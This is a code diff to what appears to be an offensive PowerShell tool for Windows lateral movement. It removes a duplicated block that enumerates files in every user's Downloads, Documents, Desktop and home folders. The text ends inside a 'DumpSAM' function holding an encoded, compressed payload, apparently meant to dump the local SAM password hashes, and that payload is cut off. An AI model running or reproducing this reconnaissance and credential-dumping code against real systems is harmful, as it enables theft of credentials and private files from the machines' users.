@@ -860,7 +860,7 @@ foreach ($User in $Users) {
 }
 '@
 
-if ($Method -eq "WMI" -or $Method -eq "SessionHunter"){
+
 
 $Files = @'
 $usersFolderPath = "C:\Users"
@@ -948,99 +948,9 @@ foreach ($user in $users) {
 }
 '@
 
-}
 
-if ($Method -ne "WMI"){
-$Files = @'
-$usersFolderPath = "C:\Users"
-$users = Get-ChildItem -Path $usersFolderPath -Directory
 
-$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk", "*.tmp")
-$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")
 
-foreach ($user in $users) {
-    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
-    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
-    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
-    $userHome = $user.FullName
-
-    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
-    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
-    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
-    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue
-
-    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
-
-    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0
-
-    if ($hasFiles) {
-        Write-Output ""
-        Write-Output "----------------------------------------------------------------------------------------------"
-        Write-Output ("[User] $user")
-        Write-Output
-
-        if ($downloadsFiles.Count -gt 0) {
-        ""
-            Write-Output ("[Downloads]")
-            $downloadsFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($documentsFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Documents]")
-            $documentsFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($desktopFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Desktop]")
-            $desktopFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-
-        if ($homeFiles.Count -gt 0) {
-        ""
-            Write-Output
-            Write-Output ("[Home]")
-            $homeFiles | Sort-Object Name | ForEach-Object {
-                $fileSize = if ($_.Length -ge 1MB) {
-                    "{0:N2} MB" -f ($_.Length / 1MB)
-                } else {
-                    "{0:N2} KB" -f ($_.Length / 1KB)
-                }
-                Write-Output ("- $($_.Name) ($fileSize)")
-            }
-        }
-        Write-Output "----------------------------------------------------------------------------------------------"
-    }
-}
-'@
-}
 
 $LocalSAM = @'
 function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
